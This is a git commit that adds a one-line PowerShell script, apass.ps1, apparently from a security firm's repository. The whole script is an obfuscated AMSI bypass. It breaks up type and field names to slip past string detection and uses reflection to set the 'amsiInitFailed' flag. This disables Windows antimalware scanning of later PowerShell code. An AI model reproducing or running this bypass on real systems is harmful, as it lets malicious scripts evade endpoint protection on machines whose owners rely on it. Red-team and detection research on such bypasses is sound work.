22ff8cda7a627bc8987c71529b2a0dba885801da
truesecgit <167188677+truesecgit@users.noreply.github.com>
2025-02-13 12:49:40 +0100

    Create apass.ps1

---
+++ apass.ps1
@@ -0,0 +1,1 @@
+$60dab640='System.M'+'anagement.Automati'+'on.{0}{1}Utils';$8d6139='si';$636f26='Am';$Ref=[Ref].Assembly.GetType(($60dab640-f $636f26,$8d6139)); $fd79b2b=$Ref.GetField(('am{0}InitFailed'-f$8d6139),'NonPublic,Static');$fd79b2b.SetValue($null,$true)
